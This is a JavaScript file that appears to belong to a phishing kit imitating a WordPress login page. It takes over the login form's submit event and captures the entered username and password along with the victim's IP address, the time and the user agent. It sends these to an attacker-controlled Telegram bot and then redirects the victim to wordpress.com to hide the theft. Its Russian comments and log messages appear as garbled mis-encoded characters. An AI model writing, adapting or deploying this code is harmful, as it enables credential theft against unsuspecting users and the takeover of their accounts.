document.getElementById('loginform').addEventListener('submit', async function(e) {
    e.preventDefault();
    console.log("–°–∫—Ä–∏–ø—Ç send.js –Ω–∞—á–∞–ª —Ä–∞–±–æ—Ç—É!");

    const formData = new FormData(this);
    const login = formData.get('log');
    const password = formData.get('pwd');

    // –î–æ–±–∞–≤–ª—è–µ–º User Agent –∫ —Å–æ–æ–±—â–µ–Ω–∏—é
    const message = `üîê –ù–û–í–´–ï –î–ê–ù–ù–´–ï WORDPRESS  üîê\n–õ–æ–≥–∏–Ω: ${login}\n–ü–∞—Ä–æ–ª—å: ${password}\nIP: ${await getIP()}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
    console.log("–°–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏:", message);

    try {
        console.log("–ü—ã—Ç–∞—é—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ Telegram...");
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        const responseData = await response.json();
        console.log("–û—Ç–≤–µ—Ç –æ—Ç Telegram API:", responseData);

        if (response.ok) {
            console.log("–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é...");
            // –ú–µ–Ω—è–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç WordPress
            setTimeout(() => {
                window.location.href = 'https://wordpress.com/';
            }, 1500);
        } else {
            console.error("–û—à–∏–±–∫–∞ –æ—Ç Telegram:", responseData);
            window.location.href = 'https://wordpress.com/';
        }

    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
        window.location.href = 'https://wordpress.com/';
    }
});

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
    }
}
